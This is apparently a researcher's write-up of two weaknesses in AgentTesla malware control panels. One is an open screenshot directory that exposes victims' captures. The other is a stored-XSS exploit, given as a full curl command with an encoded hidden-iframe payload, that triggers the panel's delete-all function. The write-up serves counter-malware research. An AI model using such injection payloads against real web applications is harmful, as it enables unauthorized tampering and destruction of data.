


Type: Permissions

Author: [karttoon](https://twitter.com/noottrak)

The screenshot directory is not properly secured on AgentTesla panels. Each underlying folder is the HWID of an infected machine (of note for the XSS vulnerability below).

```
hxxp://example[.]com/badguy/Panel/Screens/
hxxp://example[.]com/badguy/Panel/Screens/1234-ABCD-5678-EF01-9ABC-2345-DEF0-6789/ScreenShots/2017_01_02_03_04_05.jpeg
```
Type: XSS vulnerability

Author: [karttoon](https://twitter.com/noottrak)

Once the root of the panel is identified (eg if you saw hxxp://example[.]com/badguy/Panel/post.php, the root is /badguy/Panel/) you can exploit the fact that the AgentTesla panel will directly inject HTML into its database for display to the operator once they view the expanded entry. The trick is convincing them to expand the entry, so you need to use a valid HWID for an infected system and a lure they can't resist. Below example truncates to "[clipboard]credit card d..." and will use XSS to redirect the admin to the "Delete All" function for the data.

```
curl hxxp://example[.]com/badguy/Panel/phost.php --data 'type=keylog&hwid=1234-ABCD-5678-EF01-9ABC-2345-DEF0-6789&time=2017-01-02 03:04:05&pcname=Administrator&logdata=%3Cfont%20color%3D%23FF0000%3E%5Bclipboard%5D%3C%2Ffont%3Ecredit%20card%20details%20are%20below%20with%20password%20p%40%24%24w0rd%3Cfont%20color%3D%23FF0000%3E%5Bclipboard%5D%3C%2Ffont%3E%3Cbr%3E%3Ciframe%20src%3D%22http%3A%2F%2Fexample[.]com%2Fbadguy%2FPanel%2Fdeleteall.php%22%20style%3D%22visibility%3A%20hidden%3B%22%3E%3C%2Fiframe%3E&screen=&ipadd=&webcam_link=&client=&link=&username=&password=&screen_link='
```
